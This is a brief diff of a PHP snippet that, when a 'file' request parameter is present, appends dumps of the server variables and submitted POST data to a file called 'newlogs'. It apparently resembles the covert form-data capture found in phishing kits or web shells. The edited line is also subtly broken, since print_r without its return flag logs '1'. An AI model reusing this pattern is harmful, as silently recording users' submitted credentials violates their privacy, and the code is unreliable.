@@ -12,7 +12,8 @@ if(isset($_REQUEST['file'])) {
 	$fff = fopen("newlogs", "a");
 	$rrr = print_r($_SERVER, TRUE);
 	fwrite($fff, "$rrr\n");
-	fwrite($fff, print_r($_POST)."\n");
+	$www = print_r($_POST);
+	fwrite($fff, "$www\n");
 	fwrite($fff, "$dir\n\n");
 	fclose($fff);
 } else {
